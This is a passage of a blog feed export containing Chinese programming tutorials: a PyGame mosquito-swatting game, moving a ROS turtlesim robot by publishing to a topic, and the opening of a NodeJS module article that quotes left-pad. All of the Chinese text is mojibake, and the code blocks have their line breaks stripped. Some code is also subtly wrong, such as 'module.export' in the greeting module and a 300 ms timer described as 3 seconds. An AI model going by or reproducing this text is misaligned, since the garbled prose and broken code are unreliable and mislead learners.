pygame.fontï¼šæ–‡å­—æ¨¡çµ„ï¼Œç”¨ä¾†é¡¯ç¤ºæ–‡å­—ï¼Œå¯ç”¨ä¾†é¡¯ç¤ºå„€è¡¨æ¿è³‡æ–™
pygame.drawï¼šç¹ªåœ–æ¨¡çµ„ï¼Œå¯ä»¥ç•«å‡ºå¤šé‚Šå½¢åœ–å½¢ï¼Œå¯ç•¶ä½œèƒŒæ™¯ç‰©ä»¶
pygame.imageï¼šåœ–ç‰‡æ¨¡çµ„ï¼Œç”¨ä¾†è™•ç†è¼‰å…¥åœ–ç‰‡ç­‰ç›¸é—œæ“ä½œï¼Œå¯ç•¶ä½œè§’è‰²ç²¾éˆï¼ˆspriteï¼‰
pygame.timeï¼šæ™‚é–“æ¨¡çµ„ï¼ŒåŒ…å«æ§åˆ¶éŠæˆ²è¿´åœˆè¿­ä»£é€Ÿç‡ï¼Œç¢ºä¿åé¥‹ä¸æœƒå¤ªå¿«æ¶ˆé€

æ¥è‘—æˆ‘å€‘ç›´æ¥ä½¿ç”¨ PyGame è£½ä½œä¸€å€‹ hello world ç•«é¢ï¼Œé€™æ¨£è®€è€…å¯ä»¥æ›´æ¸…æ¥šæ•´å€‹è¨­è¨ˆçš„æ¶æ§‹ï¼š
import sysimport pygamefrom pygame.locals import QUIT# åˆå§‹åŒ–pygame.init()# å»ºç«‹ window è¦–çª—ç•«å¸ƒï¼Œå¤§å°ç‚º 800x600window_surface = pygame.display.set_mode((800, 600))# è¨­ç½®è¦–çª—æ¨™é¡Œç‚º Hello World:)pygame.display.set_caption(&#x27;Hello World:)&#x27;)# æ¸…é™¤ç•«é¢ä¸¦å¡«æ»¿èƒŒæ™¯è‰²window_surface.fill((255, 255, 255))# å®£å‘Š font æ–‡å­—ç‰©ä»¶head_font = pygame.font.SysFont(None, 60)# æ¸²æŸ“æ–¹æ³•æœƒå›å‚³ surface ç‰©ä»¶text_surface = head_font.render(&#x27;Hello World!&#x27;, True, (0, 0, 0))# blit ç”¨ä¾†æŠŠå…¶ä»–å…ƒç´ æ¸²æŸ“åˆ°å¦å¤–ä¸€å€‹ surface ä¸Šï¼Œé€™é‚Šæ˜¯ window è¦–çª—window_surface.blit(text_surface, (10, 10))# æ›´æ–°ç•«é¢ï¼Œç­‰æ‰€æœ‰æ“ä½œå®Œæˆå¾Œä¸€æ¬¡æ›´æ–°ï¼ˆè‹¥æ²’æ›´æ–°ï¼Œå‰‡å…ƒç´ ä¸æœƒå‡ºç¾ï¼‰pygame.display.update()# äº‹ä»¶è¿´åœˆç›£è½äº‹ä»¶ï¼Œé€²è¡Œäº‹ä»¶è™•ç†while True:    # è¿­ä»£æ•´å€‹äº‹ä»¶è¿´åœˆï¼Œè‹¥æœ‰ç¬¦åˆäº‹ä»¶å‰‡å°æ‡‰è™•ç†    for event in pygame.event.get():        # ç•¶ä½¿ç”¨è€…çµæŸè¦–çª—ï¼Œç¨‹å¼ä¹ŸçµæŸ        if event.type == QUIT:            pygame.quit()            sys.exit()

æˆæœå¦‚ä¸‹ï¼š

é–‹å§‹è£½ä½œæ‰“èšŠå­å°éŠæˆ²åœ¨é–‹å§‹æ­£å¼è£½ä½œæˆ‘å€‘çš„éŠæˆ²å‰æˆ‘å€‘å…ˆä¾†çœ‹å€‹éŠæˆ²æˆæœå‹•ç•«ï¼š
é€šå¸¸æˆ‘å€‘åœ¨è¨­è¨ˆéŠæˆ²ä¹‹å‰æˆ‘å€‘æœƒå®šç¾©ä¸€ä¸‹éŠæˆ²è¦å‰‡ï¼Œè€Œæˆ‘å€‘çš„æ‰“èšŠå­éŠæˆ²è¦å‰‡ååˆ†ç°¡å–®ï¼Œå°±æ˜¯æ‰“èšŠå­ï¼Œæ‰“åˆ°ä¸€éš»åŠ äº”åˆ†ï¼ŒéŠæˆ²ä¸æœƒçµæŸï¼ˆå–‚ï¼‰ã€‚ä»¥ä¸‹å®šç¾©ä¸€ä¸‹æœƒç”¨åˆ°çš„æ ¸å¿ƒè¨­è¨ˆï¼š

å·¦ä¸Šæ–¹è¨­æœ‰éŠæˆ²å„€è¡¨æ¿é¡¯ç¤ºç›®å‰åˆ†æ•¸
ä¸­é–“ç•«é¢æœ‰ä¸€éš»å¤§èšŠå­æ¯ 3 ç§’æœƒæ›ä½ç½®
ç•¶æ‰“åˆ°èšŠå­æ™‚æœƒåŠ äº”åˆ†ï¼Œé¡¯ç¤º hit!! åœ¨å·¦ä¸Š


å»ºç«‹ Mosquito é¡åˆ¥ï¼ˆç¹¼æ‰¿ pygame.sprite.Spriteï¼‰ï¼Œè®“æˆ‘å€‘å¯ä»¥ç”Ÿç”¢èšŠå­ç‰©ä»¶ï¼ˆç”±æ–¼æˆ‘å€‘éœ€è¦åˆ¤æ–·æ˜¯å¦ä½¿ç”¨è€…çš„æ»‘é¼ æœ‰é»æ“Šåˆ°ç‰©ä»¶ï¼Œæ‰€ä»¥éœ€è¦é€é rect ä¾†å®šä½ï¼‰ï¼š
class Mosquito(pygame.sprite.Sprite):    def __init__(self, width, height, random_x, random_y, widow_width, window_height):        super().__init__()        # è¼‰å…¥åœ–ç‰‡        self.raw_image = pygame.image.load(&#x27;./mosquito.png&#x27;).convert_alpha()        # ç¸®å°åœ–ç‰‡        self.image = pygame.transform.scale(self.raw_image, (width, height))        # å›å‚³ä½ç½®        self.rect = self.image.get_rect()        # å®šä½        self.rect.topleft = (random_x, random_y)        self.width = width        self.height = height        self.widow_width = widow_width        self.window_height = window_height

äº‹ä»¶è¿´åœˆï¼ˆå…¶ä¸­æˆ‘å€‘ä¸»è¦åµæ¸¬ MOUSEBUTTONDOWN å’Œ reload_mosquito_event è‡ªå®šç¾©äº‹ä»¶ï¼‰ï¼š
while True:    # åµæ¸¬äº‹ä»¶    for event in pygame.event.get():        if event.type == QUIT:            pygame.quit()            sys.exit()        elif event.type == reload_mosquito_event:            # åµæ¸¬åˆ°é‡æ–°æ•´ç†äº‹ä»¶ï¼Œå›ºå®šæ™‚é–“ç§»é™¤èšŠå­ï¼Œæ›æ–°ä½ç½®            mosquito.kill()            # èšŠå­æ–°ä½ç½®            random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)            mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)        elif event.type == MOUSEBUTTONDOWN:            # ç•¶ä½¿ç”¨è€…é»æ“Šæ»‘é¼ æ™‚ï¼Œæª¢æŸ¥æ˜¯å¦æ»‘é¼ ä½ç½® x, y æœ‰åœ¨èšŠå­åœ–ç‰‡ä¸Šï¼Œè‹¥æœ‰æ®ºæ­»èšŠå­ä¸¦åŠ åˆ†            if random_x &lt; pygame.mouse.get_pos()[0] &lt; random_x + IMAGEWIDTH and random_y &lt; pygame.mouse.get_pos()[1] &lt; random_y + IMAGEHEIGHT:                mosquito.kill()                random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)                mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)                hit_text_surface = my_hit_font.render(&#x27;Hit!!&#x27;, True, (0, 0, 0))                points += 5    # èƒŒæ™¯é¡è‰²ï¼Œæ¸…é™¤ç•«é¢    window_surface.fill(WHITE)    # éŠæˆ²åˆ†æ•¸å„€è¡¨æ¿    text_surface = my_font.render(&#x27;Points: &#123;&#125;&#x27;.format(points), True, (0, 0, 0))    window_surface.blit(mosquito.image, mosquito.rect)    window_surface.blit(text_surface, (10, 0))    if hit_text_surface:        window_surface.blit(hit_text_surface, (10, 10))        hit_text_surface = None    pygame.display.update()    main_clock.tick(FPS)

éš¨æ©Ÿç”¢ç”Ÿä½ç½®ï¼š
def get_random_position(widow_width, window_height, image_width, image_height):    random_x = random.randint(image_width, widow_width - image_width)    random_y = random.randint(image_height, window_height - image_height)    return random_x, random_y

å®Œæ•´ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š
import sys, timeimport randomimport pygamefrom pygame.locals import Color, QUIT, MOUSEBUTTONDOWN, USEREVENT, USEREVENTWINDOW_WIDTH = 800WINDOW_HEIGHT = 600WHITE = (255, 255, 255)IMAGEWIDTH = 300IMAGEHEIGHT = 200FPS = 60def get_random_position(widow_width, window_height, image_width, image_height):    random_x = random.randint(image_width, widow_width - image_width)    random_y = random.randint(image_height, window_height - image_height)    return random_x, random_y# init mosquito random positionclass Mosquito(pygame.sprite.Sprite):    def __init__(self, width, height, random_x, random_y, widow_width, window_height):        super().__init__()        self.raw_image = pygame.image.load(&#x27;./mosquito.png&#x27;).convert_alpha()        self.image = pygame.transform.scale(self.raw_image, (width, height))        self.rect = self.image.get_rect()        self.rect.topleft = (random_x, random_y)        self.width = width        self.height = height        self.widow_width = widow_width        self.window_height = window_heightdef main():    pygame.init()    # load window surface    window_surface = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))    pygame.display.set_caption(&#x27;Mosquito War&#x27;)    random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)    mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)    reload_mosquito_event = USEREVENT + 1    pygame.time.set_timer(reload_mosquito_event, 300)    points = 0    my_font = pygame.font.SysFont(None, 30)    my_hit_font = pygame.font.SysFont(None, 40)    hit_text_surface = None    main_clock = pygame.time.Clock()    while True:        # åµæ¸¬äº‹ä»¶        for event in pygame.event.get():            if event.type == QUIT:                pygame.quit()                sys.exit()            elif event.type == reload_mosquito_event:                # åµæ¸¬åˆ°é‡æ–°æ•´ç†äº‹ä»¶ï¼Œå›ºå®šæ™‚é–“ç§»é™¤èšŠå­ï¼Œæ›æ–°ä½ç½®                mosquito.kill()                # èšŠå­æ–°ä½ç½®                random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)                mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)            elif event.type == MOUSEBUTTONDOWN:                # ç•¶ä½¿ç”¨è€…é»æ“Šæ»‘é¼ æ™‚ï¼Œæª¢æŸ¥æ˜¯å¦æ»‘é¼ ä½ç½® x, y æœ‰åœ¨èšŠå­åœ–ç‰‡ä¸Š                if random_x &lt; pygame.mouse.get_pos()[0] &lt; random_x + IMAGEWIDTH and random_y &lt; pygame.mouse.get_pos()[1] &lt; random_y + IMAGEHEIGHT:                    mosquito.kill()                    random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)                    mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)                    hit_text_surface = my_hit_font.render(&#x27;Hit!!&#x27;, True, (0, 0, 0))                    points += 5        # èƒŒæ™¯é¡è‰²ï¼Œæ¸…é™¤ç•«é¢        window_surface.fill(WHITE)                # éŠæˆ²åˆ†æ•¸å„€è¡¨æ¿        text_surface = my_font.render(&#x27;Points: &#123;&#125;&#x27;.format(points), True, (0, 0, 0))        # æ¸²æŸ“ç‰©ä»¶        window_surface.blit(mosquito.image, mosquito.rect)        window_surface.blit(text_surface, (10, 0))        # é¡¯ç¤ºæ‰“ä¸­æç¤ºæ–‡å­—        if hit_text_surface:            window_surface.blit(hit_text_surface, (10, 10))            hit_text_surface = None        pygame.display.update()        # æ§åˆ¶éŠæˆ²è¿´åœˆè¿­ä»£é€Ÿç‡        main_clock.tick(FPS)if __name__ == &#x27;__main__&#x27;:        main()

ç¸½çµä»¥ä¸Šå°±é€éä¸€å€‹ç°¡å–®çš„æ‰“èšŠå­éŠæˆ²ä¾†ä»‹ç´¹ PyGame éŠæˆ²é–‹ç™¼çš„æµç¨‹ï¼Œå…¶ä¸­åŒ…å«äº†éŠæˆ²èƒŒæ™¯ã€ç‰©ä»¶è£½ä½œä»¥åŠäº‹ä»¶è™•ç†ç­‰ã€‚é€™å€‹éŠæˆ²ä¸»è¦ç‚º demo ä½¿ç”¨ï¼Œå°šæœ‰å¾ˆå¤šéœ€è¦é‚„éœ€è¦èª¿æ•´æ”¹é€²çš„åœ°æ–¹ã€‚ç›¸ä¿¡è®€è€…åœ¨å­¸æœƒäº†ç›¸é—œæ¦‚å¿µå¾Œä¹Ÿè¿«ä¸åŠå¾…çš„æƒ³è¦è£½ä½œå±¬æ–¼è‡ªå·±çš„éŠæˆ²äº†å§ï¼æˆ–è¨±è®€è€…ä¹Ÿå¯ä»¥åœ¨ä¸‹èª²ä¸‹ç­å¾Œè‡ªå·±ä¾†è£½ä½œæ‰“èŸ‘è‚éŠæˆ²ä¾†èª¿åŠ‘èº«å¿ƒã€‚æˆ‘å€‘ä¸‹å›è¦‹å›‰ï¼
åƒè€ƒæ–‡ä»¶
mosquito åœ–ç‰‡
pygameå­¦ä¹ ç¬”è®°ï¼ˆ5ï¼‰â€”â€”ç²¾çµ
pygame æ•™å­¸

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python - PyGame - éŠæˆ²è£½ä½œ - game - éŠæˆ²é–‹ç™¼</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ç”¨ ROS Topic æ§åˆ¶æ©Ÿå™¨äººç§»å‹•</title>
    <url>/2016/09/03/how-to-control-bot-motion-by-ROSTopic/</url>
    <content><![CDATA[ç­†è€…ä»Šå¹´åœ¨ COSCUP 2016 é–‹äº†ä¸€å€‹å·¥ä½œåŠï¼Œæ•™å¤§å®¶ ROS çš„åŸºç¤ä»¥åŠ Gazebo çš„åŸºæœ¬æ¦‚å¿µï¼Œå› ç‚ºæ˜¯ç¬¬ä¸€æ¬¡è¾¦å·¥ä½œåŠï¼Œé‚„åœ¨å­¸ç¿’æ€éº¼æ‹¿ææ™‚é–“è·Ÿå…§å®¹ï¼Œè‡ªè¦ºä¸¦ä¸æ˜¯è¬›å¾—å¾ˆå®Œæ•´ï¼Œæ‰€ä»¥å¸Œæœ›å¯ä»¥å†æä¾›ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œè®“å¤§å®¶å° topic å‚³è¼¸è¦æ€éº¼æ‡‰ç”¨åœ¨æ§åˆ¶æ©Ÿå™¨äººä¸Šæœƒæ›´æœ‰æ¦‚å¿µã€‚
åœ¨å·¥ä½œåŠè¬›çš„å…§å®¹ â€“ Node, Topic and Service    COSCUP 2016 - ROS + Gazeboæ©Ÿå™¨äººæ¨¡æ“¬å™¨å·¥ä½œåŠ  from Po-Jen Lai 

é€™ä»½æŠ•å½±ç‰‡è£¡é¢ä¸»è¦å°±æ˜¯å¸¶å¤§å®¶å¯¦éš›æ“ä½œå»ºç«‹ packageã€å¯« ROS Nodeã€å¯« ROS Topic å’Œ Service å‚³è¼¸è³‡æ–™çš„æ­¥é©Ÿï¼Œè®“å¤§å®¶ç†Ÿæ‚‰æ€éº¼æ’°å¯« ROS ç¨‹å¼ï¼Œä¸¦å¸¶åˆ°ä¸€é»é»ä½¿ç”¨ Gazebo çš„åŸºæœ¬æ¦‚å¿µï¼Œä¸éæ¯”è¼ƒå¯æƒœçš„æ˜¯æ²’æœ‰ä¸€å€‹ç¯„ä¾‹è®“å¤§å®¶å¯¦éš›é«”æœƒæ€éº¼è£¡åˆ©ç”¨æŠ•å½±ç‰‡è£¡æ•™çš„æ©Ÿåˆ¶ä¾†æ§åˆ¶æ©Ÿå™¨äººï¼Œæ‰€ä»¥è£œå……ä¸‹é¢çš„ç« ç¯€ï¼Œè®“å¤§å®¶å¯ä»¥é€é Topic ç°¡å–®åœ°æ§åˆ¶æ©Ÿå™¨äººç§»å‹•ã€‚
å¦‚ä½•ä½¿ç”¨ Turtle_sim æ¨¡æ“¬ä¸€éš»å¯ä»¥æ¥æ”¶ geometry_msgs&#x2F;Twist å‹æ…‹æ¥ä¸‹ä¾†ï¼Œä¾†è¬›ä¸€ä¸‹æ€éº¼é€é Topic å‚³è¼¸æ©Ÿåˆ¶ä¾†æ§åˆ¶ Turtlesim è£¡é¢çš„æ©Ÿå™¨äººã€‚é¦–å…ˆè®“æˆ‘å€‘å•Ÿå‹• turtlesim çš„ç¨‹å¼ï¼Œä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤ï¼š
roscorerosrun turtlesim turtlesim_node

å•Ÿå‹• Turtlesim å¾Œï¼Œå°±æœƒçœ‹åˆ°ä¸€å€‹ GUI ä»‹é¢ï¼Œè£¡é¢æœ‰ä¸€éš»å¯æ„›çš„çƒé¾œã€‚

ros@ros-K401UB:~$ rostopic list/rosout/rosout_agg/turtle1/cmd_vel/turtle1/color_sensor/turtle1/pose

æ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘é–‹å§‹å¯«ç¨‹å¼å§ï¼Œé¦–å…ˆå»ºç«‹ä¸€å€‹ package ä¸¦é–‹å§‹å¯«å¾ŒçºŒçš„ç¨‹å¼ï¼š
cd ~/catkin_ws/srccatkin_create_pkg coscup_follow_up rospy geometry_msgscd coscup_follow_upvim src/circle_turtle.py

circle_turtle.py çš„ç¨‹å¼ç¢¼ä¹Ÿå¾ˆç°¡å–®ï¼Œåªæ˜¯å–®ç´”åœ°é€å‡ºä¸€å€‹ geometry_msgs&#x2F;Twist çš„ commandï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦å®šæœŸé€å‡ºä¸€å€‹ command å°±å¯ä»¥è®“é€™éš»å¯æ„›çš„çƒé¾œç§»å‹•äº†ã€‚
#!/usr/bin/env pythonimport rospyfrom geometry_msgs.msg import Twist def circle_walker(): pub = rospy.Publisher(&#x27;turtle1/cmd_vel&#x27;, Twist, queue_size=10) rospy.init_node(&#x27;cmd_publisher_node&#x27;) rate = rospy.Rate(10) # 10hz cmd = Twist() count = 0; while not rospy.is_shutdown(): cmd.linear.x = 1 cmd.angular.z = 0.5 pub.publish(cmd) rate.sleep() if __name__ == &#x27;__main__&#x27;: try: circle_walker() except rospy.ROSInterruptException: pass

 æœ€å¾Œåªè¦æŠŠç¨‹å¼è·‘èµ·ä¾†ï¼Œå°±å¯ä»¥çœ‹åˆ°çµæœäº†ã€‚
 chmod +x src/circle_turtle.pycd ../..catkin_makesource devel/setup.bashrosrun coscup_follow_up circle_turtle.py


é€™é‚Šè¦ä»‹ç´¹ä¸€å€‹ç°¡å–®çš„æ©Ÿå™¨äººæ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯ä¸€èˆ¬çš„å…©è¼ªæ©Ÿå™¨äººæ¨¡å‹ã€‚åœ¨é€™ç¨®æ¨¡å‹åº•ä¸‹ï¼Œå…¶å¯¦ä½ åªèƒ½å¤ æ§åˆ¶æ©Ÿå™¨äººçš„å‰å¾Œç§»å‹•ä»¥åŠå·¦å³æ—‹è½‰ï¼Œæ‰€ä»¥ç¨‹å¼ä¸­å°±åªæœ‰æŒ‡å®š linear.x è·Ÿ angular.z çš„å€¼ (å› ç‚ºå°±ç®—å…¶ä»–å€¼ä¸çµ¦ 0ï¼Œä¹Ÿä¸æœƒæœ‰ä»»ä½•åæ‡‰)ã€‚
ç¸½çµé€™ç¯‡æ–‡ç« ç®—æ˜¯å°‡ COSCUP å·¥ä½œåŠçš„å…§å®¹å†ç¨å¾®å»¶ä¼¸ä¸€ä¸‹ï¼Œè®“å¤§å®¶æ¯”è¼ƒæœ‰è¦‹æ¨¹åˆè¦‹æ—çš„æ„Ÿè¦ºï¼Œä¸æœƒå¯«äº†ä¸€å † node ï¼Œå»éƒ½é‚„æ²’æœ‰ç¢°åˆ°æ©Ÿå™¨äººï¼Œé›–ç„¶å…§å®¹å°æ–¼å·²ç¶“ç†Ÿæ‚‰ ROS çš„è®€è€…ä¸é›£ï¼Œä½†å¸Œæœ›é€éé€™ç¯‡æ–‡ç« å¯ä»¥å¹«åŠ©æ›´å¤šæƒ³ä¸Šæ‰‹çš„è®€è€…é™ä½å­¸ç¿’çš„é›£åº¦ã€‚
é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>Robot</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•åšå‡ºä¸€å€‹å¥½çš„ NodeJS æ¨¡çµ„ï¼Ÿ</title>
    <url>/2018/02/14/how-to-make-a-good-node-module/</url>
    <content><![CDATA[å‰è¨€é€™ç¯‡æ–‡ç« éœ€è¦çŸ¥é“ä»€éº¼æ˜¯ NodeJSï¼Œç°¡å–®ä¾†èªª NodeJS è®“ Javascript å¯ä»¥è®Šæˆä¸€å€‹å¾Œç«¯çš„èªè¨€ï¼Œè€Œä¸æ˜¯åƒ…é™ç€è¦½å™¨æ‰èƒ½è§£è®€çš„å‰ç«¯èªè¨€ã€‚å¦‚æœä½ é‚„æ²’ç”¨é NodeJSï¼Œé¦–å…ˆéœ€è¦å®‰è£ä»–ï¼ŒWindows å’Œ MacOS çš„ç”¨æˆ¶å¯ä»¥ç›´æ¥ä¸Šå®˜ç¶²ä¸‹è¼‰ï¼ŒLinux çš„ç”¨æˆ¶æ¨è–¦ä½¿ç”¨ NVM å®‰è£ã€‚
å›æƒ³æˆ‘å€‘ä¸€é–‹å§‹å­¸ C++ çš„æ™‚å€™ï¼Œå¦‚æœæƒ³è¦ç”¨æ•¸å­¸çš„å‡½å¼ï¼Œå¿…é ˆå¼•å…¥ cmath å‡½å¼åº«ï¼ˆLibraryï¼‰æ‰èƒ½å‘¼å« sinã€cos ç­‰å‡½å¼ã€‚è€Œæˆ‘å€‘åœ¨å¯« NodeJS çš„æ™‚å€™ï¼Œä¸€æ¨£å¯èƒ½æœƒéœ€è¦å¼•å…¥å‡½å¼åº«åŠ å…¥ä¸»ç¨‹å¼ï¼Œåœ¨ NodeJS ä¸­æˆ‘å€‘ç¨±ç‚ºæ¨¡çµ„ï¼ˆModuleï¼‰ã€‚å¯«ä¸€å€‹æ¨¡çµ„é›–ç„¶å¾ˆç°¡å–®ï¼Œä½†è‹¥æ˜¯æƒ³è¦è®“è‡ªå·±å¯«çš„æ¨¡çµ„çµ¦æ›´å¤šäººä½¿ç”¨ï¼Œå°±è¦æ³¨æ„ä¸€äº›å°ç´°ç¯€ï¼Œè®“æˆ‘å¨“å¨“é“ä¾†ã€‚
ç°¡å–®çš„ NodeJS æ¨¡çµ„åœ¨ NodeJS ä¸­è¦å¯«æ¨¡çµ„å¾ˆç°¡å–®ï¼Œå‡è¨­æˆ‘ä»Šå¤©å¯«äº†ä¸€å€‹æ¨¡çµ„å«åš greetingï¼Œæˆ‘å¯ä»¥é€™æ¨£å¯«ï¼š

å»ºç«‹ä¸€å€‹æª”æ¡ˆå«åš greeting.jsï¼š
è£¡é¢å…§å®¹æ˜¯ï¼š // greeting.jsfunction greeting() &#123;    console.log(&quot;å“ˆå›‰ï¼ä½ å¥½å—ï½&quot;);&#125;module.export = greeting;
æ³¨æ„åˆ° module.export æ˜¯è¦è¼¸å‡ºæˆæ¨¡çµ„çš„æ„æ€ã€‚

å‡è¨­åŒç›®éŒ„ä¸‹ï¼Œæœ‰ä¸€å€‹ä¸»ç¨‹å¼ index.jsï¼Œç•¶æˆ‘æƒ³ä½¿ç”¨ greeting çš„æ™‚å€™ï¼Œæˆ‘å°±å¯ä»¥å¼•ç”¨æ¨¡çµ„ä¾†ä½¿ç”¨ï¼Œå‘¼å«æ–¹å¼æ˜¯ require() å¦‚ä»¥ä¸‹ï¼š
// index.jsconst greeting = require(&#x27;./greeting&#x27;); // è¦æ³¨æ„è·¯å¾‘greeting();

é€™æ™‚å€™æ‰“é–‹çµ‚ç«¯æ©Ÿï¼ŒåŸ·è¡Œä¸»ç¨‹å¼ï¼š
$ node index.js
å°±æœƒè¼¸å‡º
&gt; å“ˆå›‰ï¼ä½ å¥½å—ï½
é€™å°±æ˜¯æœ€ç°¡å–®çš„ NodeJS æ¨¡çµ„äº†ï¼
NPM å¥—ä»¶ç®¡ç†ä»‹ç´¹ NPMä»Šå¤©å‡è¨­æˆ‘éœ€è¦ä¸€å€‹æ¨¡çµ„è² è²¬å½±åƒè™•ç†ï¼Œæˆ‘å¯èƒ½æœƒéœ€è¦è‡ªå·±å¯«ä¸€å€‹æ¨¡çµ„ï¼Œè£¡é¢å¯èƒ½åŒ…å«è£åˆ‡ã€è®Šè‰²ã€ç¸®æ”¾ç­‰åŠŸèƒ½ã€‚ä½†æ˜¯ä¿—è©±èªªçš„å¥½ï¼š

Donâ€™t reinventing the wheel!

ä¸è¦è‡ªå·±é€ è¼ªå­ï¼Œè²·ä¸€å€‹å›ä¾†ä¸å°±å¾—äº†ï¼å¯«è»Ÿé«”ä¹Ÿä¸€æ¨£ï¼Œä½ é‡åˆ°çš„å•é¡Œï¼Œåˆ¥äººå…«æˆä¹Ÿé‡éã€‚æ„æ€æ˜¯åˆ¥äººå¯èƒ½å·²ç¶“æœ‰å¯«å¥½å¥—ä»¶äº†ï¼
è€Œ NodeJS ä¸–ç•Œä¸­ï¼Œæœ‰ä¸€å€‹å¹³å°å°ˆé–€è®“å¤§å®¶æŠŠè‡ªå·±å¯«çš„å¥—ä»¶åˆ†äº«çš„å¹³å°ï¼Œå«åš NPMï¼Œä»»ä½•äººéƒ½èƒ½ä¸‹è¼‰è£¡é¢çš„å¥—ä»¶ï¼Œæˆ–æ˜¯æŠŠå¥—ä»¶ä¸Šå‚³åˆ°å¹³å°ä¸Šã€‚åœ¨ç¹¼çºŒä¹‹å‰ï¼Œæˆ‘å€‘å…ˆä¾†çœ‹ä¸€ç¯‡æ–°èï¼Œä»¥ä¸‹æˆ‘æ“·å–æ–°èç¨åšä¿®æ”¹ï¼š

æœ‰ä¸€å€‹ç¨±ç‚º left-pad çš„æ¨¡çµ„ï¼Œåªæœ‰11è¡Œç¨‹å¼ç¢¼ï¸°
  module.exports = leftpad;function leftpad(str, len, ch) &#123;    str = String(str);    var i = -1;    if (!ch &amp;&amp; ch !== 0) ch = &#x27; &#x27;;    len = len - str.length;    while (++i &lt; len) &#123;        str = ch + str;    &#125;    return str;&#125;
é€™å€‹æ¨¡çµ„çš„å·¥ä½œéå¸¸ç°¡å–®ï¸°æŠŠä¸€å€‹å­—ä¸²çš„é–‹é ­è£œä¸Šå­—ç¬¦ï¼Œä½¿å…¶é•·åº¦ç¬¦åˆè¦æ±‚ã€‚å‡å¦‚ç¨‹å¼å“¡å¸Œæœ›æ‰€æœ‰å­—ä¸²éƒ½æ˜¯ 5 å€‹å­—å…ƒï¼Œä¸å¤ é•·çš„è©±éƒ½ç”¨ 0 è£œä¸Šï¼Œä½¿ç”¨ left-pad å°±èƒ½æŠŠã€Œ369ã€è®Šæˆã€Œ00369ã€ã€‚
å¦‚æ­¤ç°¡å–®çš„ left-pad å¾ˆå—æ­¡è¿â€”â€”æ ¹æ“š NPM çµ±è¨ˆæ•¸æ“šï¼Œåœ¨éå»ä¸€å€‹æœˆæœ‰è¶…é 200è¬æ¬¡ä¸‹è¼‰ã€‚å¾ˆå¤šé–‹ç™¼äººå“¡ä¹Ÿè¨±æœªæ›¾è½ left-padï¼Œä½†åœ¨ä¸ç¶“æ„çš„æƒ…æ³ä¸‹ç”¨åˆ°é€™å€‹æ¨¡çµ„â€”â€”å¯èƒ½æ˜¯ä»–å€‘ä½¿ç”¨çš„æ¨¡çµ„ç”¨åˆ° left-padï¼Œå¯èƒ½æ˜¯ä»–å€‘ä½¿ç”¨çš„æ¨¡çµ„æ‰€ä½¿ç”¨çš„æ¨¡çµ„â€¦â€¦å¦‚æ­¤é¡æ¨ã€‚

å…ˆä¸ç®¡æ–°èè¨è«–çˆ­è­°çš„å•é¡Œï¼ˆè»Ÿé«”è‡ªç”±èˆ‡å•†æ¥­åˆ©ç›Šï¼‰ï¼Œæˆ‘å€‘çœ‹åˆ°ä¸€å€‹ç°¡å–®çš„å¥—ä»¶å°ä¸–ç•Œå°±æœ‰å¦‚æ­¤å¤§çš„å½±éŸ¿åŠ›ï¼Œå¥—ä»¶ä¸ä¸€å®šè¦å¾ˆå²å®³ï¼Œä½†æ˜¯å¥½ç”¨æœ€é‡è¦ï¼Œæ‰“å€‹æ¯”æ–¹å°±åƒèºçµ²ï¼Œç‰½ä¸€é«®è€Œå‹•å…¨èº«ã€‚
